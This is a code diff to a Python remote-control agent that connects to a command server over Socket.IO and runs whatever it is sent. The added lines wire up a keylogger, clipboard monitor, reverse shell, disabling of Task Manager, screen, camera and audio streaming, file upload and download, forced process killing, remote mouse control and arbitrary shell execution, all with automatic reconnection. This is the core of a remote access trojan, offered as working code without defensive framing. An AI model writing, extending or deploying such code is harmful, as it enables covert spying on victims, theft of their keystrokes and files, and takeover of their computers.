@@ -6214,9 +6214,21 @@ def main_unified():
 @sio.event
 def connect():
     """Handle connection to server."""
-    print(f"Connected to server: {SERVER_URL}")
-    agent_id = get_or_create_agent_id()
-    sio.emit('agent_connect', {'agent_id': agent_id})
+    print(f"Connected to server via Socket.IO: {SERVER_URL}")
+    try:
+        agent_id = get_or_create_agent_id()
+        print(f"Emitting agent_connect with ID: {agent_id}")
+        sio.emit('agent_connect', {'agent_id': agent_id})
+        print("Agent connection emitted successfully")
+    except Exception as e:
+        print(f"Error in connect event: {e}")
+        # Try with fallback agent ID
+        try:
+            fallback_id = str(uuid.uuid4())
+            print(f"Using fallback agent ID: {fallback_id}")
+            sio.emit('agent_connect', {'agent_id': fallback_id})
+        except Exception as e2:
+            print(f"Failed to emit agent connection with fallback ID: {e2}")
 
 @sio.event
 def disconnect():
@@ -6230,35 +6242,111 @@ def handle_execute_command(data):
     command = data.get('command', '')
     
     try:
-        if command.startswith('start-stream'):
-            start_streaming(agent_id)
-            output = "Screen streaming started"
-        elif command.startswith('stop-stream'):
-            stop_streaming()
-            output = "Screen streaming stopped"
-        elif command.startswith('start-audio'):
-            start_audio_streaming(agent_id)
-            output = "Audio streaming started"
-        elif command.startswith('stop-audio'):
-            stop_audio_streaming()
-            output = "Audio streaming stopped"
-        elif command.startswith('start-camera'):
-            start_camera_streaming(agent_id)
-            output = "Camera streaming started"
-        elif command.startswith('stop-camera'):
-            stop_camera_streaming()
-            output = "Camera streaming stopped"
-        else:
-            # Execute system command
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            output = result.stdout if result.stdout else result.stderr
-            if not output:
-                output = f"Command executed with return code: {result.returncode}"
+        print(f"Received command via Socket.IO: {command}")
         
+        # Handle internal commands
+        internal_commands = {
+            "start-stream": lambda: start_streaming(agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(agent_id),
+            "stop-camera": stop_camera_streaming,
+            "start-keylogger": lambda: start_keylogger(agent_id),
+            "stop-keylogger": stop_keylogger,
+            "start-clipboard": lambda: start_clipboard_monitor(agent_id),
+            "stop-clipboard": stop_clipboard_monitor,
+            "start-reverse-shell": lambda: start_reverse_shell(agent_id),
+            "stop-reverse-shell": stop_reverse_shell,
+            "start-voice-control": lambda: start_voice_control(agent_id),
+            "stop-voice-control": stop_voice_control,
+            "kill-taskmgr": kill_task_manager,
+        }
+        
+        if command in internal_commands:
+            try:
+                internal_commands[command]()
+                output = f"Internal command '{command}' executed successfully"
+            except Exception as e:
+                output = f"Internal command '{command}' failed: {e}"
+        elif command.startswith("upload-file:"):
+            # Split by first two colons: upload-file:path:content
+            try:
+                parts = command.split(":", 2)
+                if len(parts) >= 3:
+                    output = handle_file_upload(parts)
+                else:
+                    output = "Invalid upload-file command format. Expected: upload-file:path:content"
+            except Exception as e:
+                output = f"File upload error: {e}"
+        elif command.startswith("download-file:"):
+            # Split by first colon: download-file:path
+            try:
+                parts = command.split(":", 1)
+                if len(parts) >= 2:
+                    output = handle_file_download(parts, agent_id)
+                else:
+                    output = "Invalid download-file command format. Expected: download-file:path"
+            except Exception as e:
+                output = f"File download error: {e}"
+        elif command.startswith("play-voice:"):
+            try:
+                parts = command.split(":", 1)
+                output = handle_voice_playback(parts)
+            except Exception as e:
+                output = f"Voice playback error: {e}"
+        elif command.startswith("live-audio:"):
+            try:
+                parts = command.split(":", 1)
+                output = handle_live_audio(parts)
+            except Exception as e:
+                output = f"Live audio error: {e}"
+        elif command.startswith("terminate-process:"):
+            # Handle process termination with admin privileges
+            try:
+                parts = command.split(":", 1)
+                if len(parts) > 1:
+                    process_target = parts[1]
+                    # Try to convert to int (PID) or use as string (process name)
+                    try:
+                        process_target = int(process_target)
+                    except ValueError:
+                        pass  # Keep as string (process name)
+                    output = terminate_process_with_admin(process_target, force=True)
+                else:
+                    output = "Invalid terminate-process command format"
+            except Exception as e:
+                output = f"Process termination error: {e}"
+        elif command.startswith("{") and "remote_control" in command:
+            # Handle remote control commands (JSON format)
+            try:
+                import json
+                command_data = json.loads(command)
+                if command_data.get("type") == "remote_control":
+                    handle_remote_control(command_data)
+                    output = "Remote control command executed"
+                else:
+                    output = "Invalid remote control command format"
+            except json.JSONDecodeError as e:
+                output = f"Invalid JSON in remote control command: {e}"
+            except Exception as e:
+                output = f"Remote control command failed: {e}"
+        elif command == "sleep":
+            time.sleep(1)
+            output = "Slept for 1 second"
+        else:
+            # Execute as system command using the proper execute_command function
+            try:
+                output = execute_command(command)
+            except Exception as e:
+                output = f"Command execution error: {e}"
+        
+        # Send result back via Socket.IO
         sio.emit('command_result', {'agent_id': agent_id, 'output': output})
         
     except Exception as e:
-        sio.emit('command_result', {'agent_id': agent_id, 'output': f"Error: {str(e)}"})
+        error_output = f"Error processing command: {str(e)}"
+        sio.emit('command_result', {'agent_id': agent_id, 'output': error_output})
 
 @sio.on('mouse_move')
 def on_mouse_move(data):
@@ -6490,7 +6578,7 @@ def agent_main():
             print(f"Privilege check failed: {e}")
     
     # Start main connection loop immediately
-    print("Starting connection loop...")
+    print("Starting Socket.IO connection loop...")
     
     # Main connection loop with background initialization monitoring
     connection_attempts = 0
@@ -6508,21 +6596,23 @@ def agent_main():
                 except Exception as e:
                     print(f"Failed to get initialization status: {e}")
             
-            # Connect to server
+            # Connect to server via Socket.IO
             connection_attempts += 1
-            print(f"Connecting to server (attempt {connection_attempts})...")
+            print(f"Connecting to server via Socket.IO (attempt {connection_attempts})...")
             
             if not SOCKETIO_AVAILABLE:
-                print("Socket.IO not available, using fallback connection method")
-                # Fallback to main_loop for non-Socket.IO operation
-                main_loop(AGENT_ID)
-            else:
-                sio.connect(SERVER_URL)
-                print("Connected successfully!")
-                sio.wait()
+                print("ERROR: Socket.IO not available. This agent requires Socket.IO to function.")
+                print("Please install python-socketio: pip install python-socketio")
+                time.sleep(30)  # Wait before retrying
+                continue
+            
+            # Connect via Socket.IO
+            sio.connect(SERVER_URL)
+            print("Connected successfully via Socket.IO!")
+            sio.wait()
                 
         except socketio.exceptions.ConnectionError as e:
-            print(f"Connection failed (attempt {connection_attempts}): {e}")
+            print(f"Socket.IO connection failed (attempt {connection_attempts}): {e}")
             print("Retrying in 10 seconds...")
             time.sleep(10)
         except KeyboardInterrupt:
